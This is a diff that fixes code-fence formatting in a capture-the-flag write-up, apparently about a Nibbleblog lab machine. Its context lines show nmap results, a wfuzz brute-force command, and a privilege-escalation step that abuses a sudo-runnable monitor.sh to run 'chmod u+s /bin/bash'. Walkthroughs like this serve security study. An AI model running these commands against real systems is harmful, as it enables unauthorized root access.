@@ -7,7 +7,7 @@ tags: [machines]
 
 ## Enumeration
 
-````ruby
+```ruby
 PORT STATE SERVICE VERSION
 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
@@ -26,7 +26,7 @@ The web page only has a ``Hello World`` , but in its source code we can find the
 
 Applying a wfuzz to it:
 
-````bash
+```bash
 wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.129.225.129/nibbleblog/FUZZ/
 ```
 
@@ -47,7 +47,7 @@ To run it, we will have to go to the directory `/content/private/plugins/my_imag
 Doing `sudo -l` we see that we can run the file `/home/nibbler/personal/personal/stuff/monitor.sh` as root,
 but as this does not exist, we create it with the following command inside
 
-````bash
+```bash
 /bin/bash
 
 chmod u+s /bin/bash
